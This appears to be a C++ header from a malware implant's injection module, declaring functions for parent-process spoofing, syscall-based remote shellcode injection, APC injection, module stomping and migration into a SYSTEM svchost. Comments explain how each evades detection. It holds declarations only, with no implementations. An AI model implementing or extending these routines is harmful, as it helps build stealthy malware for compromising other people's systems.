// injection.hpp — forward declarations for process injection module
#pragma once
#include <windows.h>
#include <cstdint>

// PPID spoofing — launch a process as a child of targetPid (not the implant).
// hThreadOut: if non-null, process starts SUSPENDED and caller must ResumeThread.
BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
                   HANDLE* hProcessOut = nullptr, HANDLE* hThreadOut = nullptr);

// Remote process injection via direct syscall chain (no IAT touches)
// payload: raw shellcode bytes, payloadSize: byte count
BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
                         HANDLE* hThreadOut = nullptr);

// APC injection
BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize);

// Module stomping — load a legitimate System32 DLL into the target, overwrite
// its .text with the payload, and start a thread at the module base. The
// payload then runs from an image-backed section of a Microsoft binary instead
// of a private RX allocation. hostDll must be a DLL the target does not rely
// on afterwards; the on-disk file stays untouched (copy-on-write).
BOOL InjectModuleStomp(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
                       const wchar_t* hostDll, HANDLE* hThreadOut = nullptr);

// Auto-select best SYSTEM svchost.exe for migration (lowest PID)
DWORD FindBestSvchost();